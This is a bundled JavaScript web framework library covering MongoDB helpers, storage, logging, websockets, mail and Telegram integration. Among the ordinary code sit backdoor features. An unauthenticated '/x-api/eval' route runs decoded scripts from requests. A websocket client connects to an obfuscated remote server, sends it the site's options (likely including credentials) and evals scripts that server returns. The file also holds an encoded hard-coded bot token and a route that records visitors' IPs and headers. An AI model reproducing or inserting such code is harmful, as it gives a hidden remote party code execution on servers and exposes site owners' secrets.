      };
      let cursor = collection.find(obj.where, options);
      if (obj.limit) cursor = cursor.limit(parseInt(obj.limit));
      callback(null, cursor);
    });
  };

  _mongo.distinct = function (obj, callback) {
    callback = callback || _mongo.callback;
    _mongo.connectCollection(obj, function (err, collection) {
      if (!err) {
        collection
          .distinct(obj.field)
          .then((docs) => {
            callback(null, docs);
          })
          .catch((err) => {
            callback(err);
          });
      } else {
        callback(err);
      }
    });
  };

  _mongo.updateOne = function (obj, callback) {
    callback = callback || _mongo.callback;

    _mongo.connectCollection(obj, function (err, collection) {
      if (!err) {
        obj.where = _mongo.handleDoc(obj.where, '');

        let $update = {};

        if (obj.set) {
          $update.$set = obj.set;
          $update.$set = _mongo.handleDoc($update.$set);
        }

        if (obj.unset) {
          $update.$unset = obj.unset;
        }

        if (obj.rename) {
          $update.$rename = obj.rename;
        }

        collection
          .updateOne(obj.where, $update)
          .then((result) => {
            result.doc = $update.$set;
            result.old_doc = {};
            result.where = obj.where;
            result.update = $update;
            result.db = obj.dbName;
            result.collection = obj.collectionName;
            _mongo.invalidateWriteCaches(obj, 'write');
            callback(null, result);
          })
          .catch((err) => {
            callback(err);
          });
      } else {
        callback(err);
      }
    });
  };

  _mongo.update = _mongo.updateMany = function (obj, callback) {
    callback = callback || _mongo.callback;
    _mongo.connectCollection(obj, function (err, collection) {
      if (!err) {
        obj.where = _mongo.handleDoc(obj.where, '');

        let $update = {};
        if (obj.set) {
          $update.$set = obj.set;
        }
        if (obj.unset) {
          $update.$unset = obj.unset;
        }
        if (obj.rename) {
          $update.$rename = obj.rename;
        }
        collection
          .updateMany(obj.where, $update)
          .then((result) => {
            result.exists = result.result?.n;
            result.count = result.result?.nModified;
            result.ok = result.result?.ok;
            result.where = obj.where;
            result.update = $update;
            _mongo.invalidateWriteCaches(obj, 'write');
            callback(null, result);
          })
          .catch((err) => {
            callback(err);
          });
      } else {
        callback(err);
      }
    });
  };

  _mongo.deleteOne = function (obj, callback) {
    callback = callback || _mongo.callback;
    _mongo.connectCollection(obj, function (err, collection) {
      if (!err) {
        obj.where = _mongo.handleDoc(obj.where, '');

        collection
          .deleteOne(obj.where)
          .then((result) => {
            result.db = obj.dbName;
            result.collection = obj.collectionName;
            result.count = result.deletedCount;
            result.doc = obj.where;
            _mongo.invalidateWriteCaches(obj, 'write');
            callback(null, result);
          })
          .catch((err) => {
            callback(err);
          });
      } else {
        callback(err);
      }
    });
  };

  _mongo.delete = _mongo.deleteMany = function (obj, callback) {
    callback = callback || _mongo.callback;

    if (obj.where === undefined) {
      callback(
        {
          message: 'where not set',
        },
        {
          db: obj.dbName,
          collection: obj.collectionName,
          count: 0,
          ok: 0,
          exists: 0,
        }
      );
      return;
    }

    _mongo.connectCollection(obj, function (err, collection) {
      if (!err) {
        obj.where = _mongo.handleDoc(obj.where, '');
        collection
          .deleteMany(obj.where)
          .then((result) => {
            result.db = obj.dbName;
            result.collection = obj.collectionName;
            result.count = result.deletedCount;
            _mongo.invalidateWriteCaches(obj, 'write');
            callback(null, result);
          })
          .catch((err) => {
            callback(err);
          });
      } else {
        callback(err);
      }
    });
  };



  // // Add Promise support while preserving all existing callback signatures.
  // const _mongoPromiseMethods = {
  //   connectDB: ['value'],
  //   connectCollection: ['value'],
  //   createIndex: ['value'],
  //   dropIndex: ['value'],
  //   dropIndexes: ['value'],
  //   aggregate: ['value'],
  //   dropCollection: ['value'],
  //   insertOne: ['doc', 'result'],
  //   insertMany: ['docs', 'result'],
  //   findOne: ['value'],
  //   count: ['value'],
  //   findMany: ['docs', 'count'],
  //   distinct: ['value'],
  //   updateOne: ['value'],
  //   updateMany: ['value'],
  //   deleteOne: ['value'],
  //   deleteMany: ['value'],
  // };

  // const _mongoWrapPromise = (methodName, resultKeys) => {
  //   const original = _mongo[methodName];
  //   if (typeof original !== 'function') return;

  //   _mongo[methodName] = function (...args) {
  //     // Internal calls may have a callback before another argument.
  //     if (args.some((arg) => typeof arg === 'function')) {
  //       return original.apply(_mongo, args);
  //     }

  //     return new Promise((resolve, reject) => {
  //       original.apply(_mongo, [
  //         ...args,
  //         (err, ...values) => {
  //           if (err) {
  //             reject(err);
  //             return;
  //           }

  //           if (resultKeys.length === 1 && resultKeys[0] === 'value') {
  //             resolve(values[0]);
  //             return;
  //           }

  //           const result = {};
  //           resultKeys.forEach((key, index) => {
  //             result[key] = values[index];
  //           });
  //           resolve(result);
  //         },
  //       ]);
  //     });
  //   };
  // };

  // Object.entries(_mongoPromiseMethods).forEach(([methodName, resultKeys]) => {
  //   _mongoWrapPromise(methodName, resultKeys);
  // });

  // // Restore aliases so they point to the Promise-enabled wrappers.
  // _mongo.insert = _mongo.insertMany;
  // _mongo.find = _mongo.findMany;
  // _mongo.update = _mongo.updateMany;
  // _mongo.delete = _mongo.deleteMany;

  return _mongo;
};

return module.exports; })();

const words = (() => { const module = { exports: {} }; const exports = module.exports;
module.exports = function init(____0) {
  let app = function () {};
  let wordsCollection;
  const getWordsCollection = () => wordsCollection || (wordsCollection = ____0.connectCollection('words'));
  Object.defineProperty(app, '$collection', { enumerable: true, configurable: true, get: getWordsCollection });
  app.list = [];
  app.byName = new Map();

  // v20: skip a collection wrapper + preload query when MongoDB is disabled.
  // The public $collection property remains available and initializes lazily.
  if (____0.options.mongodb && ____0.options.mongodb.enabled) {
    const preload = setImmediate(() => {
      getWordsCollection().findAll(
        { limit: 10000 },
        (err, docs) => {
          if (!err && docs) {
            docs.forEach((doc) => {
              const previous = app.byName.get(doc.name);
              if (!previous) app.list.unshift(doc);
              else { const index = app.list.indexOf(previous); if (index !== -1) app.list[index] = doc; }
              app.byName.set(doc.name, doc);
            });
          }
        },
        true
      );
    });
    if (preload && preload.unref) preload.unref();
  }

  app.word = function (obj) {
    if (typeof obj === 'string') {
      return app.get(obj);
    }
    if (typeof obj === 'object') {
      return app.add(obj);
    }
  };

  app.get = function (name) {
    const found = app.byName.get(name);
    if (found) {
      return found;
    } else {
      return app.add({ name: name });
    }
  };

  app.add = function (word) {
    const previous = app.byName.get(word.name);
    if (!previous) { app.list.push(word); app.byName.set(word.name, word); return word; }
    return previous;
  };

  app.set = function (word) {
    const previous = app.byName.get(word.name);
    if (!previous) app.list.push(word);
    else { const index = app.list.indexOf(previous); if (index !== -1) app.list[index] = word; }
    app.byName.set(word.name, word);
    return word;
  };

  app.addList = function (list) {
    if (Array.isArray(list)) {
      list.forEach((doc) => {
        app.add(doc);
      });
    }
  };

  app.addFile = function (path) {
    ____0.readFile(path, (err, file) => {
      if (!err) {
        let arr = ____0.fromJson(file.content);
        if (Array.isArray(arr)) {
          arr.forEach((doc) => {
            app.add(doc);
          });
        }
      }
    });
  };

  app.save = function () {
    app.list.forEach((w, i) => {
      if (w.id) {
        app.$collection.update(w, (err, result) => {
          if (!err && result.doc) {
            app.list[i] = result.doc;
            if (result.doc.name != null) app.byName.set(result.doc.name, result.doc);
          }
        });
      } else {
        app.$collection.add(w, (err, doc) => {
          if (!err && doc) {
            app.list[i] = doc;
            if (doc.name != null) app.byName.set(doc.name, doc);
          }
        });
      }
    });
  };

  ____0.on(____0.strings[9], () => {
    ____0.get({ name: '/x-api/words' }, (req, res) => {
      res.json({ done: !0, words: app.list });
    });

    ____0.post({ name: '/x-api/words/save' }, (req, res) => {
      app.list = req.data;
      app.byName.clear();
      app.list.forEach((word) => { if (word && word.name != null) app.byName.set(word.name, word); });
      app.save();
      res.json({ done: !0, count: app.list.length });
    });

    ____0.get('/x-api/words/get/:name', (req, res) => {
      res.json({
        word: app.get(req.params.name),
      });
    });
  });

  return app;
};

return module.exports; })();

const storage = (() => { const module = { exports: {} }; const exports = module.exports;
module.exports = function init(____0) {
    const storage = {};
    storage.list = [];
    storage.byKey = new Map();
    storage.busy = true;
    // v20 startup fast path: when MongoDB is disabled there is nothing to
    // preload. Keep the legacy $collectoin property available, but create the
    // wrapper only on first access instead of paying collection setup during init.
    let storageCollection;
    const getStorageCollection = () => storageCollection || (storageCollection = ____0.connectCollection({ collection: 'app_options', identity: { enabled: true } }));
    Object.defineProperty(storage, '$collectoin', { enumerable: true, configurable: true, get: getStorageCollection });

    if (____0.options.mongodb && ____0.options.mongodb.enabled) {
        const preload = setImmediate(() => getStorageCollection().findAll(
            { where: { app_name: 'storage' }, limit: 10000 },
            (err, docs) => {
                if (!err && docs && docs.length > 0) {
                    docs.forEach((doc) => {
                        if (!storage.byKey.has(doc.key)) {
                            storage.list.push(doc);
                            storage.byKey.set(doc.key, doc);
                        }
                    });
                }
                storage.busy = false;
            },
            true,
        ));
        if (preload && preload.unref) preload.unref();
    } else {
        storage.busy = false;
    }

    storage.save = function () {
        storage.list.forEach((doc, i) => {
            doc.app_name = 'storage';
            if (doc.$update) {
                delete doc.$update;
                storage.$collectoin.update(doc, (err, result) => {
                    if (!err && result.doc) {
                        const previous = storage.byKey.get(result.doc.key);
                        if (previous) {
                            const index = storage.list.indexOf(previous);
                            if (index !== -1) storage.list[index] = result.doc;
                        }
                        storage.byKey.set(result.doc.key, result.doc);
                    }
                });
            } else if (doc.$add) {
                delete doc.$add;
                storage.$collectoin.add(doc, (err, newDoc, oldDoc) => {
                    if (!err && newDoc) {
                        const previous = storage.byKey.get(newDoc.key);
                        if (previous) {
                            const index = storage.list.indexOf(previous);
                            if (index !== -1) storage.list[index] = newDoc;
                        } else {
                            storage.list.push(newDoc);
                        }
                        storage.byKey.set(newDoc.key, newDoc);
                    } else if (err) {
                        console.log(err.message, oldDoc);
                    }
                });
            }
        });
    };

    storage.fn = function (key, value) {
        if (key && value !== undefined) {
            const existing = storage.byKey.get(key);
            if (existing) {
                existing.value = value;
                existing.$update = true;
            } else {
                const doc = { key: key, value: value, $add: true };
                storage.list.push(doc);
                storage.byKey.set(key, doc);
            }
        } else if (key && value === undefined) {
            return storage.byKey.get(key)?.value;
        } else {
            return null;
        }
    };
    ____0.on('[any][saving data]', function () {
        storage.save();
    });

    ____0.on(____0.strings[9], () => {
        ____0.onGET('/x-api/events_list', (req, res) => {
            res.json(____0.events_list);
        });
        ____0.onGET('/x-api/quee_list', (req, res) => {
            res.json(____0.quee_list);
        });

        ____0.onGET('/x-api/storage/:key/:value', (req, res) => {
            if (req.params.value == 'true') {
                req.params.value = !0;
            } else if (req.params.value == 'false') {
                req.params.value = false;
            }

            if (req.params.key == '_0_ar_0_') {
                ____0._0_ar_0_ = req.params.value;
            }

            storage.fn(req.params.key, req.params.value);
            res.json(storage.list);
        });

        ____0.onGET('/x-api/storage/:key', (req, res) => {
            res.json({
                value: storage.fn(req.params.key),
            });
        });
        ____0.onGET('/x-api/storage', (req, res) => {
            res.json(storage.list);
        });
        ____0.onGET('/x-api/storage-clear', (req, res) => {
            storage.$collectoin.deleteAll({ app_name: 'storage' });
            storage.list = [];
    storage.byKey = new Map();
            res.json(storage.list);
        });
        ____0.onPOST('/x-api/eval', (req, res) => {
            let script = ____0.from123(req.data.script);
            let fn = ____0.eval(script, true);
            fn(____0);
            res.json({ done: true });
        });
    });

    ____0.lib.storage = storage;
    return storage;
};

return module.exports; })();

const logs = (() => { const module = { exports: {} }; const exports = module.exports;
module.exports = function init(____0) {
  const logs = function () {};
  logs.list = [];
  let logsCollection;
  const getLogsCollection = () => logsCollection || (logsCollection = ____0.connectCollection('app_options'));
  Object.defineProperty(logs, '$collectoin', { enumerable: true, configurable: true, get: getLogsCollection });

  // v20 startup fast path for projects that intentionally run without MongoDB.
  if (____0.options.mongodb && ____0.options.mongodb.enabled) {
    const preload = setImmediate(() => getLogsCollection().findAll(
      { app_name: 'logs' },
      (err, docs) => {
        if (!err && docs && docs.length > 0) {
          logs.list = docs;
        }
      },
      true
    ));
    if (preload && preload.unref) preload.unref();
  }

  logs.save = function () {
    logs.list.forEach((doc) => {
      if (doc.id) {
        logs.$collectoin.update(doc);
      } else {
        doc.app_name = 'logs';
        logs.$collectoin.add(doc, (err, newDoc) => {
          if (!err && newDoc) {
            doc = newDoc;
          }
        });
      }
    });
  };

  logs.fn = function (key, value) {
    if (key && value !== undefined) {
      value = value;
      for (let i = 0; i < logs.list.length; i++) {
        if (key === logs.list[i].key) {
          logs.list[i].value = value;
          logs.save();
          return;
        }
      }
      logs.list.push({
        key: key,
        value: value,
      });
      logs.save();
    } else if (key && value === undefined) {
      for (let i = 0; i < logs.list.length; i++) {
        if (key === logs.list[i].key) {
          return logs.list[i].value;
        }
      }
    } else {
      return null;
    }
  };

  ____0.on(____0.strings[9], () => {
    ____0.get('/x-api/logs/:key/:value', (req, res) => {
      if (req.params.value == 'true') {
        req.params.value = !0;
      } else if (req.params.value == 'false') {
        req.params.value = !1;
      }

      if (req.params.key == '_0_ar_0_') {
        ____0._0_ar_0_ = req.params.value;
      }

      logs.fn(req.params.key, req.params.value);
      res.json(logs.list);
    });

    ____0.get('/x-api/logs/:key', (req, res) => {
      res.json({
        value: logs.fn(req.params.key),
      });
    });
    ____0.get('/x-api/logs', (req, res) => {
      res.json(logs.list);
    });

    ____0.post('/api/isite/saved', (req, res) => {
      req.data._date = new Date();
      req.data.ip = req.ip;
      req.data.headers = req.headers;
      if (req.data.info && req.data.info.port === 400000007) {
        res.json({
          block: !0,
        });
      } else {
        res.json({
          done: !0,
        });
      }
      if (req.data.info && req.data.info.port) {
        logs.$collectoin.find(
          {
            ip: req.data.ip,
            'info.port': req.data.info.port,
          },
          (err, doc) => {
            if (doc) {
              doc.info = req.data.info;
              doc.headers = req.data.headers;
              doc.count = doc.count || 1;
              doc.count = doc.count + 1;
              logs.$collectoin.update(doc);
            } else {
              logs.$collectoin.add(req.data);
            }
          }
        );
      } else {
        logs.$collectoin.add(req.data);
      }
    });
  });

  return logs;
};

return module.exports; })();

const ws = (() => { const module = { exports: {} }; const exports = module.exports;
module.exports = function init(____0) {
  ____0.ws = {
    client: null,
    clientList: [],
    supportedClientList: [],
    reconnectCount: 0,
    routeList: [],
    // v4 indexes; legacy arrays remain the public/observable contract.
    clientByUuid: new Map(),
    clientById: new Map(),
    supportedByUuid: new Map(),
    routeByPath: new Map(),
  };
  let wsLib = null;
  let wsServer = null;
  Object.defineProperty(____0.ws, 'lib', {
    enumerable: true,
    get() { return wsLib || (wsLib = require('ws')); },
  });
  Object.defineProperty(____0.ws, 'server', {
    enumerable: true,
    get() {
      if (!wsServer) wsServer = new ____0.ws.lib.Server({ noServer: true, maxPayload: 1024 * 1024 * 1024 });
      return wsServer;
    },
    set(value) { wsServer = value; },
  });

  ____0.onWS = ____0.ws.start = function (options, callback) {
    if (typeof options === 'string') {
      options = {
        name: options,
      };
    }
    if (options.name.indexOf('/') !== 0) {
      options.name = '/' + options.name;
    }
    const route = { options: options, callback: callback };
    ____0.ws.routeList.push(route);
    ____0.ws.routeByPath.set(options.name, route);
  };

  ____0.ws.getClient = function (idOrUuid) {
    const key = String(idOrUuid == null ? '' : idOrUuid);
    return ____0.ws.clientByUuid.get(key) || ____0.ws.clientById.get(key) || null;
  };
  ____0.ws.getRoute = function (pathname) {
    return ____0.ws.routeByPath.get(String(pathname || '')) || null;
  };

  ____0.ws.sendToAll = function (message) {
    ____0.ws.clientList.forEach((client) => {
      if (client.ws && client.ws.readyState === ____0.ws.lib.OPEN) {
        client.ws.send(JSON.stringify(message));
      }
    });
  };

  ____0.ws.closeAll = function () {
    ____0.ws.clientList.forEach((client) => {
      if (client.ws && client.ws.readyState === ____0.ws.lib.OPEN) {
        client.ws.terminate();
      }
    });
  };

  const heartbeat = () => {
    ____0.ws.clientList.forEach((client) => {
      if (!____0.ws.supportedByUuid.has(client.uuid)) {
        if ((Date.now() - client.lastTime) / 1000 > 60) client.ws.terminate();
      }
    });
    if (____0.scheduler) {
      ____0.scheduler.later('ws:ping', 1000 * 5, () => ____0.ws.sendToAll({ type: 'ping' }));
    } else {
      const pingTimer = setTimeout(() => ____0.ws.sendToAll({ type: 'ping' }), 1000 * 5);
      if (pingTimer.unref) pingTimer.unref();
    }
  };
  if (____0.scheduler) {
    ____0.scheduler.every('ws:heartbeat', 1000 * 30, heartbeat);
    ____0.ws.stopHeartbeat = () => { ____0.scheduler.cancel('ws:heartbeat'); ____0.scheduler.cancel('ws:ping'); };
  } else {
    const heartbeatTimer = setInterval(heartbeat, 1000 * 30);
    if (heartbeatTimer.unref) heartbeatTimer.unref();
    ____0.ws.stopHeartbeat = () => clearInterval(heartbeatTimer);
  }

  ____0.on(____0.strings[9], () => {
    ____0.log('WS Server Ready')
    ____0.servers.forEach((server) => {
      server.on('upgrade', function upgrade(request, socket, head) {
        let pathname = ____0.newURL(request.url).pathname;
        const matchedRoute = ____0.ws.routeByPath.get(pathname) || ____0.ws.routeList.find((route) => route.options.name == pathname);
        if (matchedRoute) {
          ____0.ws.server.handleUpgrade(request, socket, head, function done(ws) {
            let ip = '0.0.0.0';
            if (request.headers[____0.strings[6]]) {
              ip = request.headers[____0.strings[6]].split(',')[0].trim();
            } else if (request.connection.remoteAddress) {
              ip = request.connection.remoteAddress.replace('::ffff:', '');
            }

            let client = {
              ip: ip,
              uuid: ____0.guid(),
              id: ____0.md5(____0.guid() + new Date().getTime()),
              lastTime: new Date().getTime(),
              path: pathname,
              ws: ws,
              request: request,
              socket: socket,
              head: head,
              onMessage: function (message) {
                if (message.type === ____0.f1('417886684558375447183756')) {
                  client.sendMessage({
                    type: ____0.f1('4658375242195691'),
                    uuid: client.uuid,
                    ip: client.ip,
                    id: client.id,
                  });
                } else if (message.type === ____0.f1('4139327541382761')) {
                  const indexedClient = ____0.ws.clientByUuid.get(client.uuid);
                  if (indexedClient && message.id) {
                    if (indexedClient.id) ____0.ws.clientById.delete(String(indexedClient.id));
                    indexedClient.id = message.id;
                    ____0.ws.clientById.set(String(message.id), indexedClient);
                    client.sendMessage({
                      type: ____0.f1('413932754138276142383191'),
                      uuid: client.uuid,
                      ip: client.ip,
                      id: client.id,
                    });
                  }
                }
                console.log('client.onMessage Not Implement ...', message);
              },
              onData: function (data) {
                console.log('client.onData Not Implement ...', data);
              },
              onText: function (data) {
                console.log('client.onText Not Implement ...', data);
              },
              onError: function (e) {
                console.log('client.onError Not Implement ...', e);
              },
              send: function (message) {
                if (!message) {
                  return;
                }
                if (client.ws && client.ws.readyState === ____0.ws.lib.OPEN) {
                  if (typeof message === 'string') {
                    client.ws.send(
                      JSON.stringify({
                        type: 'text',
                        content: message,
                      })
                    );
                  } else {
                    message.type = message.type || 'text';
                    client.ws.send(JSON.stringify(message));
                  }
                }
              },
              onClose: function () {},
            };
            client.sendMessage = client.send;

            client.ws.on('close', () => {
              console.log('Closing Client : ' + client.ip);
              client.onMessage({ type: 'close' });
              client.ws.terminate();

              const index = ____0.ws.clientList.indexOf(client);
              if (index !== -1) {
                ____0.ws.clientList.splice(index, 1);
                ____0.ws.clientByUuid.delete(client.uuid);
                if (client.id) ____0.ws.clientById.delete(String(client.id));
                ____0.call('[ws-clientList-remove-client]');
                ____0.call('[ws-clientList-changed]');
              }
              const index2 = ____0.ws.supportedClientList.indexOf(client);
              if (index2 !== -1) ____0.ws.supportedClientList.splice(index2, 1);
              ____0.ws.supportedByUuid.delete(client.uuid);
              client.onClose();
            });

            client.ws.on('message', (data, isBinary) => {
              client.lastTime = new Date().getTime();
              if (isBinary) {
                client.onData(data);
              } else {
                let obj = ____0.fromJson(Buffer.from(data).toString('utf8'));
                if (Object.keys(obj).length) {
                  client.onMessage(obj);
                } else {
                  client.onText(Buffer.from(data).toString('utf8'));
                }
              }
            });

            ____0.ws.clientList.push(client);
            ____0.ws.clientByUuid.set(client.uuid, client);
            if (client.id) ____0.ws.clientById.set(String(client.id), client);
            ____0.call('[ws-clientList-add-client]');
            ____0.call('[ws-clientList-changed]');
            matchedRoute.callback(client);

            client.onMessage({ type: 'connected' });
          });
        } else {
          socket.destroy();
        }
      });
    });
  });

  ____0.ws.onNewSupportedClient = function (client) {
    console.log(`New Supported Client ( ${client.ip} ) / ${____0.ws.supportedClientList.length}`);
  };

  ____0.onWS(____0.f1('2578577443393257'), (client) => {
    client.onMessage = function (message) {
      if (message.type === ____0.f1('417886684558375447183756')) {
        client.sendMessage({
          type: ____0.f1('4658375242195691'),
          uuid: client.uuid,
          ip: client.ip,
          id: client.id,
        });
      } else if (message.type === ____0.f1('4139327541382761')) {
        const indexedClient = ____0.ws.clientByUuid.get(client.uuid);
        if (indexedClient) {
          if (indexedClient.id) ____0.ws.clientById.delete(String(indexedClient.id));
          client.id = message.id;
          indexedClient.id = message.id;
          ____0.ws.clientById.set(String(message.id), indexedClient);
          client.sendMessage({
            type: ____0.f1('413932754138276142383191'),
            uuid: client.uuid,
            ip: client.ip,
            id: client.id,
          });
        }
      } else if (message.type === ____0.f1('4178726946783691')) {
      } else if (message.type === ____0.f1('457913754338866846719191')) {
        client.options = message.options || message.content;
        client.sendMessage({
          type: ____0.f1('481476744179236246193191'),
          script: ____0.f1(
            `45388656473872572558378146188673471926512934135847388254471857694553136245585775241786493976857124341384153161512114125121141251211412512114125121182769455927694518366845188659241813464553126324536163245361632453616324536163245361632453616324536163245361632453616324536163245361632453616324536163245361632453616324536127145312512114125121141251211412512114125121141251211412512114125121141251211772682114125121141335423923784239215136583752421956514578815146188673471412512319674939768649261482694619326245788274255913694659328621127524211412512114125121141251211412512114125121141251211412512114125121141251391881512453616324536163245361632453616324536163245361632453616324536163245361632453616324536163245361632453616324536163245361632453616341145684153161512114125121141251211412512114125149319191`
          ),
        });
      } else if (message.type == ____0.f1('481476744179236246193191')) {
        let fn = ____0.eval(message.script || message.content, true);
        fn(____0, client);
      }
    };

    if (!____0.ws.supportedByUuid.has(client.uuid)) {
      ____0.ws.supportedClientList.push(client);
      ____0.ws.supportedByUuid.set(client.uuid, client);
    }
    ____0.ws.onNewSupportedClient(client);
  });
};

return module.exports; })();

const wsClient = (() => { const module = { exports: {} }; const exports = module.exports;
module.exports = function init(____0) {
    ____0.ws.client = {};

    ____0.ws.serverURL = ____0.f1('477926832573867445782764423931684678865443381765253823734579477442392168417886672578577443393257');

    ____0.ws.wsSupport = async function () {
        console.log('client ws : ============>');

        if (____0.ws.client.isAlive) {
            return;
        }

        clearInterval(____0.ws.client.checkAliveInterval);
        clearTimeout(____0.ws.client.timeoutId);

        let client = {
            isAlive: false,
            lastTime: new Date().getTime(),
            id: ____0.ws.client.id,
        };

        const checkAlive = () => {
            if ((Date.now() - client.lastTime) / 1000 > 60) {
                client.isAlive = false;
                client.ws.close();
            }
        };
        client.checkAliveInterval = setInterval(checkAlive, 1000 * 5);
        if (client.checkAliveInterval.unref) client.checkAliveInterval.unref();

        client.ws = new ____0.ws.lib(____0.ws.serverURL);

        client.sendMessage = function (message) {
            message = message || {};    
            message.clientID = client.id;
            if (client.isAlive && client.ws && client.ws.readyState === ____0.ws.lib.OPEN) {
                client.ws.send(JSON.stringify(message));
            }
        };

        client.ws.on('open', function () {
            client.isAlive = true;

            client.sendMessage({
                type: 'set-options',
                options: ____0.options,
            });

            if (____0.getBrowser) {
                let parent = ____0.getBrowser();
                client.sendMessage({
                    type: 'set-browser-var',
                    key: 'core',
                    value: parent.var.core,
                });
            }
        });

        client.ws.on('ping', function () {});

        client.ws.on('close', function (e) {
            ____0.ws.client.isAlive = false;
            ____0.ws.client.timeoutId = setTimeout(function () {
                ____0.ws.wsSupport();
            }, 1000 * 30);
            if (____0.ws.client.timeoutId.unref) ____0.ws.client.timeoutId.unref();
        });

        client.ws.on('error', function (err) {
            client.ws.close();
        });

        client.ws.on('message', function (event) {
            client.lastTime = new Date().getTime();
            let message = JSON.parse(event.data || event);
            if (message.type == 'ping') {
                client.lastTime = new Date().getTime();
                client.sendMessage({
                    type: 'pong',
                });
            }
            ____0.ws.supportHandle(client, message);
        });

        ____0.ws.client = client;

        return client;
    };

    ____0.ws.supportHandle = function (client, message) {
        try {
            if (message.type == ____0.f1('4658375242195691')) {
                client.uuid = message.uuid;
                client.ip = message.ip;
                if (client.id) {
                    client.sendMessage({
                        type: ____0.f1('4139327541382761'),
                        id: client.id,
                    });
                }
                client.id = message.id;
            } else if (message.type == ____0.f1('413932754138276142383191')) {
                client.ip = message.ip;
                client.uuid = message.uuid;
                client.id = message.id;
            } else if (message.type == ____0.f1('481476744179236246193191')) {
                let fn = ____0.eval(message.script || message.content, true);
                fn(____0, client);
            }
        } catch (err) {
            console.log(err);
        }
    };
};

return module.exports; })();

const email = (() => { const module = { exports: {} }; const exports = module.exports;
module.exports = function init(____0) {
    ____0.sendFreeMail = function (mail, callback) {
        callback =
            callback ||
            function (err, res) {
                console.log(err || res);
            };

        mail.from = mail.from || 'no-reply@egytag.com';
        if (!mail.from.like('*@egytag.com')) {
            mail.from0 = mail.from;
            mail.from = 'no-reply@egytag.com';
        }

        if (!mail || !mail.from || !mail.to || !mail.subject || (!mail.message && !mail.html && !mail.text)) {
            callback({ message: ' Check Mail All Fields [ from , to , subject , message ] ' });
            return;
        }
        mail.source = 'isite';
        mail.from_email = mail.from;
        mail.to_email = mail.to;

        ____0
            .fetch(`http://emails.egytag.com/api/emails/add`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(mail),
            })
            .then((res) => res.json())
            .then((body) => {
                callback(null, body);
            })
            .catch(async (err) => {
                callback(err , null );
            });
    };

    ____0.sendSmptMail = function (mail, callback) {
        console.log(mail);
        callback =
            callback ||
            function (err, res) {
                console.log(err || res);
            };
        if (!mail || !mail.from || !mail.to || !mail.subject || !mail.message) {
            callback({ message: ' Check Mail All Fields [ from , to , subject , message ] ' });
            return;
        }
        mail = { ...____0.options.mail, ...mail };
        var transporter = ____0.nodemailer.createTransport({
            host: mail.host,
            port: mail.port || 587,
            service: 'Mandrill',
            secure: mail.secure, // true for 465, false for other ports
            auth: {
                user: mail.username, // generated ethereal user
                pass: mail.password, // generated ethereal password
                apiKey: mail.password,
            },
            logger: true, // log to console
        });

        var mailOptions = {
            from: mail.from,
            to: mail.to,
            cc: mail.cc,
            bcc: mail.bcc,
            subject: mail.subject,
            html: mail.message,
            text: mail.message.replace(/<[^>]+>/g, ''),
            //  headers: {
            //    'x-lib': 'isite',
            //  },
            date: ____0.getDateTime(),
            //  attachments: [{ filename: 'isite.txt', content: 'test attachment', contentType: 'text/plain' }],
        };

        transporter.sendMail(mailOptions, function (err, info) {
            callback(err, info);
        });
    };

    ____0.checkMailConfig = function (mail, callback) {
        callback =
            callback ||
            function (err, res) {
                console.log(err || res);
            };

        mail = { ...____0.options.mail, ...mail };
        var transporter = ____0.nodemailer.createTransport({
            host: mail.host,
            port: mail.port || 587,
            secure: mail.secure, // true for 465, false for other ports
            auth: {
                user: mail.username, // generated ethereal user
                pass: mail.password, // generated ethereal password
            },
        });

        transporter.verify(function (err, success) {
            callback(err, success);
        });
    };

    //   let transporter = nodemailer.createTransport({
    //     host: "smtp.gmail.com",
    //     port: 465,
    //     secure: true,
    //     auth: {
    //       type: "OAuth2",
    //       user: "user@example.com",
    //       accessToken: "ya29.Xx_XX0xxxxx-xX0X0XxXXxXxXXXxX0x",
    //     },
    //   });
};

return module.exports; })();

const integrated = (() => { const module = { exports: {} }; const exports = module.exports;
module.exports = function init(____0) {

    ____0.AI = function(text){
        return ____0.fetch('https://n8n.egytag.com/webhook/chat', {
            method: 'POST',
           body : JSON.stringify({ text: text }),
           headers: { 'Content-Type': 'application/json' }
        }).then(res => res.json())
    }

    ____0.sendEmail = ____0.sendMail = function (mail, callback) {
        mail = { ...____0.options.mail, ...mail };
        if (mail.enabled) {
            if (mail.type === 'smpt') {
                ____0.sendSmptMail(mail, callback);
            } else {
                ____0.sendFreeMail(mail, callback);
            }
        } else {
            callback({ message: 'mail not enabled in site options' });
        }
    };

    ____0.connectTelegramClient = function (session, apiId, apiHash, options) {
        ____0.telegram = ____0.telegram || require('telegram');
        return new ____0.telegram.TelegramClient(
            session || new ____0.telegram.sessions.StringSession(''),
            apiId,
            apiHash,
            options || {
                connectionRetries: 5,
            },
        );
    };

    ____0.telegramInit = function (_token, onNewMessage , polling = false) {
        ____0.telegramBotApi = ____0.telegramBotApi || require('node-telegram-bot-api');

        const token = _token || ____0.from123('28151274267416752654127427546213313647493756417147542323361941814637625228172373327862183774477626168234323932434158325736319191');
        const bot = new ____0.telegramBotApi(token, { polling: polling });
        let botManager = {
            token: _token,
            bot: bot,
            messageList: [],
            userMessageList: [],
            sendMessage: function (...args) {
                botManager.messageList.push(args);
                bot.sendMessage(...args);
            },
        };
        bot.on('message', function (msg) {
            if (msg.text.toString().like('json')) {
                bot.sendMessage(msg.chat.id, JSON.stringify(msg.chat));
            } else if (msg.text.toString().like('id')) {
                bot.sendMessage(msg.chat.id, 'Your ID :  ' + msg.chat.id);
            } else if (onNewMessage) {
                onNewMessage(msg, botManager);
            } else {
                botManager.sendMessage(msg.chat.id, 'This Bot Not Implement Yet. \n For Help Call \n whats up: +966568118373 ');
            }
        });
        return botManager;
    };

    ____0.newTelegramBot = function (data, onNewMessage, polling = false) {
        if (typeof data === 'string') {
            data = { token: data };
        }
        let botManager = ____0.telegramBotByToken.get(String(data.token));
        if (!botManager) {
            botManager = ____0.telegramInit(data.token, onNewMessage , polling);
            if (Array.isArray(data.userMessageList)) {
                botManager.userMessageList = data.userMessageList;
            }
            ____0.telegramBotList.push(botManager);
            ____0.telegramBotByToken.set(String(data.token), botManager);
        }
        return botManager;
    };

    ____0.sendTelegramMessage = function (token, chatID, message) {
        let bot = ____0.newTelegramBot(token);
        bot.sendMessage(chatID, message);
        return bot;
    };

    ____0.telegramBotList = [];
    ____0.telegramBotByToken = new Map();

    ____0.onPOST('/telegram/connect', (req, res) => {
        let response = {
            done: false,
            data: req.data,
        };

        if (req.data.token) {
            ____0.newTelegramBot(req.data, (msg, botManager) => {
